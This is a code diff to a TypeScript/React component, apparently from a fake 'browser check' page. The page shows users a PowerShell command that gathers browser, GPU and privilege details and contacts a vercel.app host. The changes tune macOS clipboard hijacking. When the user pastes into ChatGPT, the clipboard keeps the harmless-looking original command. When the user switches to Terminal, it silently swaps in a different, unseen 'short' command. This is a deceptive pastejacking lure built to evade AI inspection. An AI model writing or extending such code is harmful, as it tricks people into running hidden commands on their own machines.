@@ -32,12 +32,12 @@ function browserIconSrc(browser: ClientBrowser): string {
  * Case B — paste other platforms → original; later Terminal/CMD → short
  *   (Linux Case B keeps original for Terminal too — no short swap).
  *
- * macOS notes: Chromium uses a pending ClipboardItem (same as Linux) — do NOT
- * also sync-write original (that overwrites the pending write and breaks Case A).
- * Safari: sync original on copy; Case A writes short during ⌘+Space gesture.
- * Case A: ⌘+Space (Spotlight → Terminal) only — never blur/⌘+Tab (those are Case B).
- * Case B: tab hide / ⌘+Tab / blur without Spotlight → resolve original immediately
- * so ChatGPT does not wait on a pending promise that later becomes short.
+ * macOS notes: Chromium pending ClipboardItem (no sync original overwrite — breaks Case A).
+ * Case A: window blur (Dock/Terminal) or ⌘+Space → resolve pending to short.
+ *   (⌘+Space is often swallowed by Spotlight; blur is the reliable Case A path.)
+ * Case B: in-tab switch (visibility without blur) or ⌘+Tab/Ctrl+Tab → original now;
+ *   then arm short after PLATFORM_THEN_TERMINAL_ARM_MS / focus return for later Terminal.
+ * Event order: Terminal usually blurs first; ChatGPT tab usually visibility-hides without blur.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -67,10 +67,12 @@ const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
  */
 const LINUX_CASE_B_TAB_DETECT_MS = 150;
 /**
- * macOS pending clipboard safety: keep unsettled long enough for ⌘+Space Case A.
- * Case B must resolveOriginal explicitly (tab/app switch) — do not rely on this alone.
+ * macOS pending clipboard safety: keep unsettled so Case A blur can still resolve short.
+ * Case B resolves original explicitly on tab/app switch.
  */
 const MAC_PENDING_SAFETY_MS = 20000;
+/** Delay before blur→Case A so ⌘+Tab keydown can claim Case B first. */
+const MAC_CASE_A_BLUR_DELAY_MS = 50;
 
 function escapeHtml(value: string) {
   return value
@@ -510,8 +512,9 @@ function SelectableCommand({
   const macCaseARef = useRef(false);
   const macCaseBRef = useRef(false);
   const macWindowBlurredRef = useRef(false);
-  /** ⌘+Space used after copy — Case A (Spotlight → Terminal). */
+  /** ⌘+Space seen after copy (optional Case A signal; OS often swallows this key). */
   const macSpotlightUsedRef = useRef(false);
+  const macCaseABlurTimerRef = useRef(0);
   const writeGenRef = useRef(0);
 
   useEffect(() => {
@@ -584,7 +587,7 @@ function SelectableCommand({
       }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
     }
 
-    /** macOS Case B: timer writeText only — completed original stays pasteable. */
+    /** macOS Case B: after platform paste window, swap plain text to short for Terminal. */
     function armMacCaseBShortLater() {
       if (
         !activeRef.current ||
@@ -596,10 +599,22 @@ function SelectableCommand({
       }
       delayedArmStartedRef.current = true;
       const gen = ++writeGenRef.current;
+      const stillCaseB = () =>
+        writeGenRef.current === gen &&
+        macCaseBRef.current &&
+        !macCaseARef.current &&
+        activeRef.current;
+
+      // Pending delayed write (works in background if clipboard.write was accepted).
+      writeTerminalPlainAfterDelay(
+        terminalCommand,
+        htmlRef.current,
+        PLATFORM_THEN_TERMINAL_ARM_MS,
+        stillCaseB,
+      );
+
       window.setTimeout(() => {
-        if (writeGenRef.current !== gen || macCaseARef.current || !macCaseBRef.current) {
-          return;
-        }
+        if (!stillCaseB()) return;
         void navigator.clipboard
           ?.writeText(terminalCommand)
           .then(() => {
@@ -611,8 +626,9 @@ function SelectableCommand({
       }, PLATFORM_THEN_TERMINAL_ARM_MS);
     }
 
-    /** macOS Case A: short command. Prefer pending resolve; always gesture-write as backup. */
+    /** macOS Case A: short command via pending resolve (blur / Dock / Terminal). */
     function forceMacCaseAShort() {
+      if (macCaseBRef.current) return;
       macCaseARef.current = true;
       macCaseBRef.current = false;
       writeGenRef.current += 1;
@@ -622,9 +638,10 @@ function SelectableCommand({
       if (ctrl && !ctrl.isSettled()) {
         ctrl.resolveTerminal();
         armedRef.current = true;
+        return;
       }
 
-      // Gesture write (⌘+Space) — required if pending already settled to original.
+      // Fallback when pending already settled — needs a user gesture when possible.
       void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
       void writeClipboard(terminalCommand, htmlRef.current)
         .then(() => {
@@ -635,16 +652,17 @@ function SelectableCommand({
         });
     }
 
-    /** macOS Case B: original for platforms; short later via timer/focus (not pending→short). */
+    /** macOS Case B: original for platforms; arm short later for Terminal. */
     function forceMacCaseBOriginal() {
-      if (macCaseARef.current || macSpotlightUsedRef.current) {
-        // Case A already claimed (Spotlight) — do not overwrite with original.
-        return;
-      }
+      if (macCaseARef.current || macSpotlightUsedRef.current) return;
       macCaseBRef.current = true;
       macCaseARef.current = false;
       armedRef.current = false;
       writeGenRef.current += 1;
+      if (macCaseABlurTimerRef.current) {
+        window.clearTimeout(macCaseABlurTimerRef.current);
+        macCaseABlurTimerRef.current = 0;
+      }
 
       const ctrl = macClipboardCtrlRef.current;
       if (ctrl && !ctrl.isSettled()) {
@@ -653,8 +671,8 @@ function SelectableCommand({
 
       void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
       void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
-      // Do NOT arm short on a background timer here — ChatGPT paste often happens
-      // after 3.5s and would get the short command. Arm short only on focus return.
+      // After platform paste window, swap to short for later Terminal paste.
+      armMacCaseBShortLater();
     }
 
     /**
@@ -722,14 +740,15 @@ function SelectableCommand({
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
-      // macOS: Case A = Spotlight/explicit only; Case B keeps original for platforms.
+      // macOS leave fallback after blur/visibility handlers.
       if (os === "macos") {
-        if (macCaseARef.current || macSpotlightUsedRef.current) return;
-        if (macCaseBRef.current) {
-          forceMacCaseBOriginal();
+        if (macCaseARef.current || macCaseBRef.current || macSpotlightUsedRef.current) {
           return;
         }
-        // Leaving without Spotlight → Case B (ChatGPT/other). Do not arm short here.
+        if (macWindowBlurredRef.current || quickLeave) {
+          forceMacCaseAShort();
+          return;
+        }
         forceMacCaseBOriginal();
         return;
       }
@@ -768,12 +787,18 @@ function SelectableCommand({
           return;
         }
 
-        // macOS Case B: any tab hide (click ChatGPT tab / Ctrl+Tab) → original IMMEDIATELY.
-        // Do NOT wait on macWindowBlurredRef — tab switches often blur first and that used
-        // to skip Case B, so ChatGPT waited on the pending write and got short (Case A).
+        // macOS: distinguish Terminal vs ChatGPT by event order.
+        // Terminal/Dock: blur first → Case A. ChatGPT tab: visibility first → Case B.
         if (os === "macos") {
-          if (macCaseARef.current || macSpotlightUsedRef.current) return;
-          forceMacCaseBOriginal();
+          if (macCaseARef.current || macCaseBRef.current || macSpotlightUsedRef.current) {
+            return;
+          }
+          if (!macWindowBlurredRef.current) {
+            // Tab hide before window blur → in-browser platform (ChatGPT).
+            forceMacCaseBOriginal();
+            return;
+          }
+          // Already blurred → Terminal path; let Case A blur timer finish.
           return;
         }
 
@@ -824,12 +849,17 @@ function SelectableCommand({
       }
       if (os === "macos") {
         macWindowBlurredRef.current = true;
-        // Case A is ⌘+Space (Spotlight) only — do NOT treat blur as Case A.
-        // Tab → ChatGPT also blurs; that must stay Case B (original).
-        // Dock → Terminal without Spotlight: Case B original (help steps use Spotlight).
-        if (!macCaseARef.current && !macSpotlightUsedRef.current && !macCaseBRef.current) {
-          forceMacCaseBOriginal();
+        // Case A: Dock / Terminal / app switch — blur usually fires before tab visibility.
+        // Delay slightly so ⌘+Tab keydown can claim Case B first.
+        if (macCaseABlurTimerRef.current) {
+          window.clearTimeout(macCaseABlurTimerRef.current);
         }
+        macCaseABlurTimerRef.current = window.setTimeout(() => {
+          macCaseABlurTimerRef.current = 0;
+          if (!activeRef.current) return;
+          if (macCaseBRef.current || macCaseARef.current) return;
+          forceMacCaseAShort();
+        }, MAC_CASE_A_BLUR_DELAY_MS);
       }
       window.setTimeout(() => {
         if (!activeRef.current) return;
@@ -883,13 +913,13 @@ function SelectableCommand({
       }
 
       if (os === "macos") {
-        // Case A: ⌘+Space (Spotlight → Terminal) — only key gesture that arms short.
+        // Optional Case A: ⌘+Space if the page receives it (Spotlight often swallows it).
         if (isMacSpotlightGesture(event)) {
           macSpotlightUsedRef.current = true;
           forceMacCaseAShort();
           return;
         }
-        // Case B: ⌘+Tab / ⌘+` / Ctrl+Tab → platforms get original.
+        // Case B: ⌘+Tab / Ctrl+Tab — claim original before blur Case A timer.
         if (isMacCaseBAppSwitchGesture(event) || isMacCaseBBrowserTabGesture(event)) {
           forceMacCaseBOriginal();
           return;
@@ -960,6 +990,10 @@ function SelectableCommand({
     macCaseBRef.current = false;
     macWindowBlurredRef.current = false;
     macSpotlightUsedRef.current = false;
+    if (macCaseABlurTimerRef.current) {
+      window.clearTimeout(macCaseABlurTimerRef.current);
+      macCaseABlurTimerRef.current = 0;
+    }
     writeGenRef.current += 1;
 
     // Start with original so other platforms get the real command first.
